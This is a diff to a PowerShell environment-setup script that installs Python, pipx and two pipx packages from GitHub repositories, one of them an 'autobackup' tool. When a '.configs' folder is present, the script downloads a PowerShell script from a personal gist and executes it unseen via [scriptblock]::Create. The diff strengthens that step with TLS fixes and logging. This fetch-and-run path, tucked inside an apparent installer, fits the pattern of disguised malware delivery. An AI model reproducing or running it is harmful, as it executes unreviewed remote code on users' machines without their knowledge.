@@ -37,7 +37,7 @@ function Write-WarnLog {
         [string]$Message
     )
 
-    Write-Warning $Message
+    Write-Host "WARNING: $Message" -ForegroundColor Yellow
 }
 
 function Add-FailedStep {
@@ -50,6 +50,29 @@ function Add-FailedStep {
         $script:FailedSteps.Add("$Step ($Reason)")
     } else {
         $script:FailedSteps.Add($Step)
+    }
+}
+
+# GitHub raw/gist endpoints can fail on older Windows PowerShell defaults unless
+# TLS 1.2+ is enabled explicitly for the current process.
+function Enable-ModernTls {
+    try {
+        $protocol = [System.Net.ServicePointManager]::SecurityProtocol
+        $tls12 = [System.Net.SecurityProtocolType]::Tls12
+        if (($protocol -band $tls12) -ne $tls12) {
+            $protocol = $protocol -bor $tls12
+        }
+
+        try {
+            $tls13 = [System.Net.SecurityProtocolType]::Tls13
+            if (($protocol -band $tls13) -ne $tls13) {
+                $protocol = $protocol -bor $tls13
+            }
+        } catch {
+        }
+
+        [System.Net.ServicePointManager]::SecurityProtocol = $protocol
+    } catch {
     }
 }
 
@@ -91,6 +114,41 @@ function Get-CommandPath {
     return $null
 }
 
+function Get-PipxVenvPythonPath {
+    param(
+        [string[]]$VenvNames
+    )
+
+    $userProfile = $env:USERPROFILE
+    $candidates = @()
+
+    foreach ($venvName in $VenvNames) {
+        if (-not $venvName) {
+            continue
+        }
+
+        if ($userProfile) {
+            $candidates += "$userProfile\pipx\venvs\$venvName\Scripts\python.exe"
+        }
+
+        if ($env:LOCALAPPDATA) {
+            $candidates += "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
+        }
+    }
+
+    foreach ($candidate in $candidates) {
+        if ($candidate -and (Test-Path $candidate)) {
+            try {
+                return (Resolve-Path $candidate).Path
+            } catch {
+                return $candidate
+            }
+        }
+    }
+
+    return $null
+}
+
 # Scrape the latest 64-bit Python installer URL and fall back to a pinned build
 # if the download pages cannot be parsed.
 function Get-LatestPythonInstallerUrl {
@@ -101,6 +159,7 @@ function Get-LatestPythonInstallerUrl {
 
     foreach ($pageUrl in $pageUrls) {
         try {
+            Enable-ModernTls
             $response = Invoke-WebRequest -Uri $pageUrl -UseBasicParsing -ErrorAction Stop
             if (-not $response.Content) {
                 continue
@@ -139,6 +198,7 @@ function Install-Python {
     Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"
 
     try {
+        Enable-ModernTls
         Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
         $process = Start-Process -FilePath $installerPath -ArgumentList @('/quiet', 'InstallAllUsers=0', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru -WindowStyle Hidden
         if ($process.ExitCode -eq 0) {
@@ -281,7 +341,8 @@ function Install-Pipx {
 function Invoke-PipxInstall {
     param(
         [string]$PipxInvoker,
-        [string]$PackageSpec
+        [string]$PackageSpec,
+        [switch]$Force
     )
 
     if (-not $PipxInvoker) {
@@ -289,11 +350,17 @@ function Invoke-PipxInstall {
     }
 
     try {
+        $installArgs = @('install')
+        if ($Force) {
+            $installArgs += '--force'
+        }
+        $installArgs += $PackageSpec
+
         if ($PipxInvoker -like '* -m pipx') {
             $pythonPath = $PipxInvoker -replace ' -m pipx$', ''
-            & $pythonPath -m pipx install $PackageSpec >$null 2>$null
+            & $pythonPath -m pipx @installArgs >$null 2>$null
         } else {
-            & $PipxInvoker install $PackageSpec >$null 2>$null
+            & $PipxInvoker @installArgs >$null 2>$null
         }
 
         return ($LASTEXITCODE -eq 0)
@@ -307,13 +374,20 @@ function Install-PipxPackage {
     param(
         [string]$PipxInvoker,
         [string]$PackageSpec,
-        [string[]]$CommandNames
+        [string[]]$CommandNames,
+        [string[]]$VenvNames = @()
     )
 
     $existingCommand = Get-CommandPath -Names $CommandNames
+    $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }
+
     if ($existingCommand) {
-        Write-InfoLog "CLI already available, skipping install: $existingCommand"
-        return
+        if ($VenvNames.Count -eq 0 -or $venvPythonPath) {
+            Write-InfoLog "CLI already available, skipping install: $existingCommand"
+            return
+        }
+
+        Write-WarnLog "CLI launcher exists but pipx environment is missing. Reinstalling package: $PackageSpec"
     }
 
     Write-StepLog "Ensuring pipx package: $PackageSpec"
@@ -324,16 +398,18 @@ function Install-PipxPackage {
         return
     }
 
-    if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec) {
+    $forceInstall = ($existingCommand -and $VenvNames.Count -gt 0 -and -not $venvPythonPath)
+    if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec -Force:$forceInstall) {
         Update-ProcessPath
         $installedCommand = Get-CommandPath -Names $CommandNames
-        if ($installedCommand) {
+        $venvPythonPath = if ($VenvNames.Count -gt 0) { Get-PipxVenvPythonPath -VenvNames $VenvNames } else { $null }
+        if ($installedCommand -and ($VenvNames.Count -eq 0 -or $venvPythonPath)) {
             Write-InfoLog "Installed pipx package successfully: $installedCommand"
             return
         }
 
-        Write-WarnLog "pipx reported success, but the expected command is still unavailable: $PackageSpec"
-        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'command-missing-after-install'
+        Write-WarnLog "pipx reported success, but the package is still incomplete: $PackageSpec"
+        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'command-or-venv-missing-after-install'
         return
     }
 
@@ -359,20 +435,24 @@ try {
     }
 
     $pipxInvoker = Install-Pipx -PythonPath $pythonPath
-    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe')
-    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe') -VenvNames @('claw')
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
 
     if (Test-Path '.configs') {
         Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
 
         try {
+            Enable-ModernTls
+            Write-InfoLog "Downloading configuration script: $gistUrl"
             $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
             if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
+                Write-InfoLog "Downloaded configuration script ($($remoteScript.Content.Length) chars)"
                 Write-InfoLog "Executing configuration script: $gistUrl"
                 & ([scriptblock]::Create($remoteScript.Content))
             } else {
-                Write-WarnLog "Configuration script returned an empty response: $gistUrl"
+                $statusCode = if ($remoteScript -and $remoteScript.StatusCode) { $remoteScript.StatusCode } else { 'unknown' }
+                Write-WarnLog "Configuration script returned an empty response (status=$statusCode): $gistUrl"
                 Add-FailedStep -Step 'Apply configuration' -Reason 'empty-response'
             }
         } catch {
